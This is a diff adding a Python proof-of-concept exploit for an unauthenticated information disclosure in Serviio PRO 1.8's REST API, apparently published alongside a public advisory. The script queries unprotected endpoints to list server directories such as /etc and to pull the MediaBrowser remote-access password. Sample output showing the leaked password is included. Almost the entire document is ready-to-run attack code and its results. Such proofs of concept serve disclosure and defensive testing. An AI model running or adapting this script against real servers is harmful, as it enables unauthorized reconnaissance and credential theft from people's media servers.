@@ -1,0 +1,141 @@
+#!/usr/bin/env python
+#
+#
+# Serviio PRO 1.8 DLNA Media Streaming Server REST API Information Disclosure
+#
+#
+# Vendor: Petr Nejedly | Six Lines Ltd
+# Product web page: http://www.serviio.org
+# Affected version: 1.8.0.0 PRO, 1.7.1, 1.7.0, 1.6.1
+#
+# Summary: Serviio is a free media server. It allows you to stream your media
+# files (music, video or images) to renderer devices (e.g. a TV set, Bluray player,
+# games console or mobile phone) on your connected home network.
+#
+# Vendor:
+# "Security:
+# MediaBrowser (as well as any app that uses the API) uses well proven security techniques,
+# so that you can be sure your content is only accessed by you. Make sure you keep your password
+# secure."
+#
+# Desc: The version of Serviio installed on the remote Windows/Linux host is affected
+# by an information disclosure vulnerability due to improper access control enforcement
+# of the Configuration REST API. An unauthenticated, remote attacker can exploit this,
+# via a specially crafted request, to gain access to potentially sensitive information.
+#
+# Tested on: Restlet-Framework/2.2
+#            Windows 7, UPnP/1.0 DLNADOC/1.50, Serviio/1.8
+#            Mac OS X, UPnP/1.0 DLNADOC/1.50, Serviio/1.8
+#            Linux, UPnP/1.0 DLNADOC/1.50, Serviio/1.8
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2017-5404
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5404.php
+#
+# SSD Advisory: https://blogs.securiteam.com/index.php/archives/3094
+#
+#
+# 12.12.2016
+#
+
+
+import sys
+import xml.etree.ElementTree as ET
+from urllib2 import Request, urlopen
+
+if (len(sys.argv) <= 2):
+        print '[*] Usage: serviio_id.py <ip address> <port>'
+        print '[*] Example: serviio_id.py 10.211.55.3 23423'
+        exit(0)
+
+host = sys.argv[1]
+port = sys.argv[2]
+
+headers = {'Accept': 'application/xml'}
+request = Request('http://'+host+':'+port+'/rest/import-export/online', headers=headers)
+print '\nPrinting ServiioLinks:'
+print '----------------------\n'
+response_body = urlopen(request).read()
+roottree = ET.fromstring(response_body)
+
+for URLs in roottree.iter('serviioLink'):
+     print URLs.text
+
+print
+
+headers = {'Accept': 'application/xml'}
+#request = Request('http://'+host+':'+port+'/rest/list-folders?directory=C:\\', headers=headers)
+request = Request('http://'+host+':'+port+'/rest/list-folders?directory=/etc', headers=headers)
+print '\nPrinting directories:'
+print '---------------------\n'
+response_body = urlopen(request).read()
+roottree = ET.fromstring(response_body)
+
+for URLs in roottree.iter('path'):
+     print URLs.text
+
+print
+
+headers = {'Accept': 'application/xml'}
+request = Request('http://'+host+':'+port+'/rest/remote-access', headers=headers)
+print '\nPrinting mediabrowser password:'
+print '-------------------------------\n'
+response_body = urlopen(request).read()
+roottree = ET.fromstring(response_body)
+
+for URLs in roottree.iter('remoteUserPassword'):
+     print URLs.text
+
+print
+
+
+'''
+rewt@zslab:~# python serviio_id.py 10.211.55.3 23423         
+
+Printing ServiioLinks:
+----------------------
+
+serviio://video:feed?url=http%3A%2F%2FRSSEXAMPLEURL%2Fzsl.xml
+serviio://video:live?url=http%3A%2F%2FLIVESTREAMEXAMPLE%2Fzsl
+serviio://video:web?url=http%3A%2F%2FWEBRESOURCEEXAMPLE%2Fzsl.resource
+
+
+Printing directories:
+---------------------
+
+/etc/apache2
+/etc/asl
+/etc/cups
+/etc/defaults
+/etc/emond.d
+/etc/mach_init.d
+/etc/mach_init_per_login_session.d
+/etc/mach_init_per_user.d
+/etc/manpaths.d
+/etc/newsyslog.d
+/etc/openldap
+/etc/pam.d
+/etc/paths.d
+/etc/periodic
+/etc/pf.anchors
+/etc/postfix
+/etc/ppp
+/etc/racoon
+/etc/security
+/etc/snmp
+/etc/ssh
+/etc/ssl
+/etc/sudoers.d
+
+
+Printing mediabrowser password:
+-------------------------------
+
+s3cr3to
+
+rewt@zslab:~#
+'''
